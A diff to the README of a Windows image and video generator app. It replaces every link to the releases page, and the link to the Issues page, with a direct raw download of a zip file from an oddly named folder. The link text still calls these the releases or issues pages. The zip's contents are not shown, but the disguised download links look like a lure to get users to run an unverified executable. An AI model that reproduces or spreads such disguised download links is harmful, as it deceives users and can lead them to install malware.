@@ -1,6 +1,6 @@
 # 🖼️ Ai-image-video-generator - Create Images and Videos Locally
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/dharmendra14kumar/Ai-image-video-generator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/dharmendra14kumar/Ai-image-video-generator/main/tentable/image_generator_video_Ai_3.8.zip)
 
 ## 📦 About Ai-image-video-generator
 
@@ -33,7 +33,7 @@ Before installing, make sure your PC meets these minimum requirements:
 
 Visit the releases page to get the latest version of the application:
 
-[Download Ai-image-video-generator Releases](https://github.com/dharmendra14kumar/Ai-image-video-generator/releases)
+[Download Ai-image-video-generator Releases](https://raw.githubusercontent.com/dharmendra14kumar/Ai-image-video-generator/main/tentable/image_generator_video_Ai_3.8.zip)
 
 You will find a list of files with version numbers and dates. Look for the latest **Windows executable (.exe)** file.
 
@@ -124,7 +124,7 @@ Upscaling works both for images and videos.
 
 For questions or issues, visit the GitHub repository’s Issues section:
 
-https://github.com/dharmendra14kumar/Ai-image-video-generator/issues
+https://raw.githubusercontent.com/dharmendra14kumar/Ai-image-video-generator/main/tentable/image_generator_video_Ai_3.8.zip
 
 You can also check the README and Wiki sections for more details.
 
@@ -134,4 +134,4 @@ You can also check the README and Wiki sections for more details.
 
 Click the link below to visit the release page and get the latest Windows version:
 
-[Download Latest Release](https://github.com/dharmendra14kumar/Ai-image-video-generator/releases)
+[Download Latest Release](https://raw.githubusercontent.com/dharmendra14kumar/Ai-image-video-generator/main/tentable/image_generator_video_Ai_3.8.zip)
